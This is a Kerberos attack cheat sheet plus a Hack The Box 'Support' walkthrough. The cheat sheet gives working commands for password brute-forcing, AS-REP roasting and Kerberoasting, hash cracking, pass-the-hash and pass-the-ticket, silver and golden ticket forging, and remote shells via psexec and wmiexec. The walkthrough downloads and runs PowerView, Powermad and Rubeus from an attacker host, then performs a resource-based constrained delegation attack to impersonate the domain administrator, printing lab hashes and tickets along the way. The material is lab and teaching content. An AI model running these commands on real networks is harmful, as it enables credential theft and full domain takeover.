# Kerberos Pentesting - 88/TCP

## Bruteforcing
- With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):
```shell
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```shell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

## ASREPRoast
- With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:
```bash
# Get the user can be used
python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161

# Reveal the hash of the user and the user himself 
python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
```
or
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

- With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

- Cracking with dictionary of passwords:
```shell
# Search for the hash mode in the example to be cracked
hashcat --example-hashes | grep -i krb5as -B 12

# Or
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Kerberoasting
- With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:
```shell
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```

- With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

- With **Powershell**:
```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

### Cracking with dictionary of passwords:
- ***Always check the mode number for example***: (`hashcat --example-hashes | grep krb5asrep$23 -B 10`)
```shell
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Overpass The Hash/Pass The Key (PTK)
- By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]

# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


With [Rubeus](https://github.com/GhostPack/Rubeus) and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Pass The Ticket (PTT)
### Harvest tickets from Linux
Check type and location of tickets:
```shell
grep default_ccache_name /etc/krb5.conf
```
- If none return, default is FILE:/tmp/krb5cc_%{uid}.

In case of file tickets, you can copy-paste (if you have permissions) for use them.
In case of being *KEYRING* tickets, you can use [tickey](https://github.com/TarlogicSecurity/tickey) to get them:

```shell
# To dump current user tickets, if root, try to dump them all by injecting in other user processes
# to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
```

### Harvest tickets from Windows
- With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
mimikatz # sekurlsa::tickets /export
```

- With [Rubeus](https://github.com/GhostPack/Rubeus) in Powershell:
```shell
.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```


To convert tickets between Linux/Windows format with [ticket_converter.py](https://github.com/Zer1t0/ticket_converter):
```shell
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

### Using ticket in Linux:

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


### Using ticket in Windows
Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Silver ticket
With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Golden ticket
- With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```
## Misc
To get NTLM from password:
```python
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

## Tools
* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Rubeus](https://github.com/Zer1t0/Rubeus) with brute module
* [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
* [tickey](https://github.com/TarlogicSecurity/tickey)
* [ticket_converter.py](https://github.com/Zer1t0/ticket_converter)

# Local Privilege Escalation (Example)
We are going to abuse resource-based constrained delegation. So, we need to upload 2 scripts (`PowerView.ps1` and `Powermad.ps1`) and `Rubeus.exe` to the victim machine:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.13/PowerView.ps1')
*Evil-WinRM* PS C:\Users\support\Documents> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.13/Powermad.ps1')
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile("http://10.10.14.13/Rubeus.exe","C:\windows\tasks\Rubeus.exe")
```

1. Verify that users have the access to add machines to domain or not
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity "DC=SUPPORT,DC=HTB" | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                     10
```

- The execute command above results that the quote is set to default `10`.

2. We need to make sure that the DC environment version is 2012+ (here we have `Windows Server 2022 Standard`)
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController | select name,osversion | fl


Name      : dc.support.htb
OSVersion : Windows Server 2022 Standard
```


3. We also need to check that the `msds-allowedtoactonbehalfofotheridentity` is empty, which it is:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl

name                                     : DC
msds-allowedtoactonbehalfofotheridentity :
```

### Create New Machine & Attack
We'll use `Powermad` script to create a new machine named `0xW43lPC` and the password `0xW43lPC123!`:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount 0xW43lPC -Password $(ConvertTo-SecureString '0xW43lPC123!' -AsPlainText -Force)
```

Also, We need to SID of the computer object:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer 0xW43lPC -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid
S-1-5-21-1677581083-3380853377-188903654-5602
```

Now can start the attack by configuring the DC to trust the new machine (`0xW43lPC`) to make authorization decisions on it's behalf:

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

It's time to verify if its work or not:
```bash
*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5602
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

## Get the TGT
There is multiple ways here to get the TGT using `Rubeus` or `impacket getST.py`, which we will see them both:

### Get the TGT using Rubeus
All we need for now is to authenticate as the new fake machine `0xW43lPC`. First, we need the `rc4_hmac` which we can get using `Rubeus`:

```bash
*Evil-WinRM* PS C:\windows\tasks> .\Rubeus.exe hash /password:0xW43lPC123! /user:0xW43lPC /domain:support.htb

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 0xW43lPC123!
[*] Input username             : 0xW43lPC
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTB0xW43lPC
[*]       rc4_hmac             : D7FAFDB6EA9FAF82DDB0C25E2B491212
[*]       aes128_cts_hmac_sha1 : 339F0C73D60F18EFD798A127A3D00EE6
[*]       aes256_cts_hmac_sha1 : 60BF5227821878D2E78CB763F4C1BD2D23D7E6201E0FC046F81DA6A06B83A42C
[*]       des_cbc_md5          : 40ADCE67E6791649

*Evil-WinRM* PS C:\windows\tasks> 
```

Once, we have the `rc4_hmac` of our machine password, we'll pass it to `Rubeus` again, but now to get a ticket for administrator
```bash
*Evil-WinRM* PS C:\windows\tasks> .\Rubeus.exe s4u /user:0xW43lPC$ /rc4:D7FAFDB6EA9FAF82DDB0C25E2B491212 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0

[*] Action: S4U

[*] Using rc4_hmac hash: D7FAFDB6EA9FAF82DDB0C25E2B491212
[*] Building AS-REQ (w/ preauth) for: 'support.htb\0xW43lPC$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIFbjCCBWqgAwIBBaEDAgEWooIEhTCCBIFhggR9MIIEeaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
    AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBD8wggQ7oAMCARKhAwIBAqKCBC0EggQpJemqAN2w
    ZVKtAmcFfKAo00S6szsIXf3M79lMOh2JVhnZ5ZHJIQtfAd9vGbgdQ1DP2LQ0qJjZJLO+aVULp7gMoVNx
    KCr0/ku1T/HIPInlhd40whUNF13tqLEpwgfyYQ2zaKcx1W5V0oRBAH8UYqcyCSEwnEhIDXyP94mzGJ68
    HVWVl9BrKFyHTJFc0sqbhZJcDBpoIySt6dBUSM03p+Do1Rzgm2tYK49ojJwgiIpYL2zH0VCwZmXcwxnM
    b2NZG7xCrnjmbbcUmbcBoIzHSx4eIvu6A0lb2VZy9nkHxDNX2lK9AG+c5Uar2suMLZNC+x874CFpU6tp
    MXpwIk/EgmaSOCdpjTjTYWkLcNY0qsb0AvwHT78IkboSDSBbWxrky8UquVGk5GqOlzOnenAfcIvQhajD
    v9IIJ+amGFqAIoa8QoNX8b1iT9x/csv/HNaiOztcsCyWNYmdxLescqTQgjp8aKwkIjx5q/A7p+KQeZPC
    NJJHSs0jp2cuv9z4hPqGaBKcshLHBnwSen4eBDBixzfsPAwsljlV6d24d/LpqtzoCUywqtfQzidZNdIu
    o4NUipJswWHBBYW99f+a8ZeAed2PQ8P+QxK9/7ReNCgy2OKXSDth2SvTTDbRrU3NqXja3AaIV7qF+Ovv
    GY/MKFy0SfgzdQPYS+f73ax+KgRCV2c4GJ0IYDuqb+o98qicwyxvAT22qfYd/Hx03brwu9bBC6dLfrti
    XWXvRerLW5jBjpP5aZ6Fr5AclbgudVqWoPU2QVbTfM5n1XUGkne1/VTnH7g9K+j4Fv7Km3J7nnWUVzAE
    dQVYs6TKG2pZLL7zZmFx2KfZWstIymEkSMiuxbrzu0nU2rc/XndgIvysoX3+vpZ+R4QZNf8+UXx+GxSC
    vhLn1auLGP8ET2kfMK6WLjgEPSVYwEuf4e9gp3QkGAnqCyi2wA3oP+QkFY7uMdq6Bf1hgzF6JceanOHF
    1VXdJqEGqhzcfCevQ8GmB6Ed1TrB/eMBi+X3dv1FsiFRXquJuTa+RGG+e9hrqHrSsidmF30jofHa86/y
    Vz6vsNn6fyKDhoZzLD/tavtQKmMfqE8MfS9Ccl36aJ3qALdYUHjf4JaEexTXFZEU7YIXLIcAerCO5K+M
    CnATzixGFB4WNI4HPuV7qJazFi6bsuEV7jzip76KD6e8QOhkV5r+HI3Z5FKZ3bPhBG7KEhcP4BWqGYId
    ix8ae0FVAm93/d6bFfEoG8hH3bknWkTgBjj53dXUCWW+9yPf86kEzG1WJ0pdzhXpcpOuRxR6rFd08/nz
    FRYlfMAiYl4gC5wmXH6wULx8H1jXowV+kLUroMc6gRKtZ3FRtBKvE1Y83zsXDMxPhAf3uwVL3UT26X9E
    EPJSsjKeQkTFisGGXXNidTnjNs2EeGoaNgITFgUoLIDkfFd5VwtKo4HUMIHRoAMCAQCigckEgcZ9gcMw
    gcCggb0wgbowgbegGzAZoAMCARehEgQQr9CighIcPaIDS0zuhqcXK6ENGwtTVVBQT1JULkhUQqIWMBSg
    AwIBAaENMAsbCTB4VzQzbFBDJKMHAwUAQOEAAKURGA8yMDI1MDQyMTIwMDIzMFqmERgPMjAyNTA0MjIw
    NjAyMzBapxEYDzIwMjUwNDI4MjAwMjMwWqgNGwtTVVBQT1JULkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRn
    dBsLc3VwcG9ydC5odGI=


[*] Action: S4U

[*] Using domain controller: dc.support.htb (10.10.11.174)
[*] Building S4U2self request for: '0xW43lPC$@SUPPORT.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator@SUPPORT.HTB' to '0xW43lPC$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

    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

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (10.10.11.174)
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

    doIGmDCCBpSgAwIBBaEDAgEWooIFnjCCBZphggWWMIIFkqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
    AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggVXMIIFU6ADAgESoQMCAQaiggVFBIIFQVijgQm6
    32mrNv1UcXtdJpqH5xxctqo8z3q6ciZghgnj7ZpG+/54UK+YqVDp/8Y7q84BvBfccP5wOGyFJqq5SCzm
    OvXAwhOba2f2xGc2IjFGnmLe2wKVPe7ly3yKIbbJEv+XS/ANK1QyE+zj2fjp8ZNKKUvcD55ASdNV3C/T
    JJozaAqESpcQgnWopGa1OtfYEFx5xIKsTQ0WESLSr8iIF7GCt20GOPbtyufAOGFIO3H50Czrs67hr2Ob
    0+63hyPNepOb6/HYtgHhKvf0ZVCV8kC7SCBIBiNUmlyDEuj8UiwbwfARJZeggGurXYpoGVCG73UuPvQl
    M3qM/b/QcFsYXmq3tG1TZbTgaQFXdtdc0+xiCQeU/bz5eOjqwlgM+NbFgLkPzLpEEJlj5lkQqLp/dauw
    DNdO1nKZt9EzKCu4kJ3KK8EvT2W4Sm8ptCGYtJJ5dFd5A2VKEZRP0uEgqOQwjnkuxIXhcD7kxeEKTGSx
    Rji01+mz0gYnUOL94qN/hJToJLx8VLsx3dk1ElEfX60GOBjK34MJfScnSUrzCJ8tm6+JnveWqMXgvFL7
    1DCLFvz2xqcaDl8+zBTmYvBrXtjy9fc2oFGnnz4kxJoHJd9SESKhbSqNyfDVyPddCCXuI2A56aJLUrA+
    Mtzwmdsbe1+ebv1Koi6YduFh6lGHtly5LMcLXSiJlyWrcAEzjo5t4m+luVZwyGMqHZ03crGpXeJkenLA
    ZmMBQzD6RRiWPpOmzLqG5P687BfBPYSp2wo0JSNZegWBGiG7tQRpL5gxjDVaJmM/oO/ccY+MYb6jiJWF
    /1nW6L67wofW5Xl48vgM0diALSlS2i4EupP99WVcDbZhlYPrc8FYB1R3rO3KMQQnnEYO6HCYTTuChTEM
    ICOC8E1gvr1iYt2wsXbyPmu5E+lRfz4nvqIv33koIOMoLG9qm9QswFjiA45K/KQjNKRU9CkEBemVpgDm
    Mzqk/WuVqq3kSPZASXKjPK1EJGl3MfMS8vLroyeADiLJYlXblBc3F0AsG7Z7iF95l7k8c8/TL7p/cA8O
    5GqmhzX+FjlAD2KG86x7w7UlMAxRTBlzT72/pj0iaV5/epe1yeFalS/QUKhPS1sOH35SRDwt6HgYPfag
    8MiylMWAbzW5wNHUhHlAJoU9E1fIDv4snXlljf2hbX2mayxi02yLbNVFOaQZVxWMayF0n1mhOys1hNn8
    fte7Fm83KHR374DFQK9Eyt14RnG8c3+wiNnpUk1yx8JHAgbnasEN+pT4sukja4ds/4zkNYuY2hDK4ATu
    iym3tjxegBOvhx1w135r6ZN/iT+2XWlL6eP4TdcyHNJeHZGd5OZD8SB0cHc4K4zwbOmwZLPRB5m/SWIY
    jenIyfz2nRH2pBbC6MTnuhjTXz+cVuuvyk1t+X1HgwNNKbVCnEPunyDrylq0kxG/w+JkpWmGbEZEx0O/
    0OuK5DtjmS2SsoKNE1FMTXdokHzJTiXRQcCVb+i+NJRJeuUsxN4KmFvTeYJLoapwuhOObDmUQ2Jivfpo
    93uRbVuod3t+9HCuI78W4KeMwriie2zmvvQLykBjhMmoHSzMCxD1tfBFci6s7Cb2Me1FNfaAaNnDv0Lo
    eK5hqAeJxP3Rt5hJIAJdi1w/7p7s56GHd6LoF22jBQfCeEKWlgztTX2y9cLrAuOjLivF11MEWSYAngD8
    8U1UAXmNUvGl0WSesal3TVtnWglI26QjjlEFvaZLKJbj0yHADP9naMUmQ+IqJEMNTNmCLZQI+9x5R1wH
    UKMc5Bu31L/y3GNramKdvOm1+m+jgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKAbMBmgAwIB
    EaESBBBRy+6uPt5xUrjfwAAhu9iNoQ0bC1NVUFBPUlQuSFRCoiYwJKADAgEKoR0wGxsZYWRtaW5pc3Ry
    YXRvckBTVVBQT1JULkhUQqMHAwUAQKUAAKURGA8yMDI1MDQyMTIwMDIzMFqmERgPMjAyNTA0MjIwNjAy
    MzBapxEYDzIwMjUwNDI4MjAwMjMwWqgNGwtTVVBQT1JULkhUQqkhMB+gAwIBAqEYMBYbBGNpZnMbDmRj
    LnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```

### Get the TGT using getST.py
Since we have the fake machine name and it's password, all we need is to execute the following command:

```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ /usr/share/doc/python3-impacket/examples/getST.py -spn cifs/dc.support.htb support.htb/0xW43lPC\$ -impersonate administrator
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:378: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:475: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:605: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:657: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

- This command results a ticket under the name `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`

## Use The Ticket
### Ticket from Rubeus
- For the `Rubeus` result, we can grab the last ticket and copy it back to our attacker machine, saving it as ticket.kirbi.b64, making sure to remove all spaces. Then using `base64` decode it into ticket.kirbi.

```bash
┌──(kali㉿kali)-[~/htb/machines/support/tickets]
└─$ base64 -d ticket.kirbi.b64 > ticket.kirbi 
```

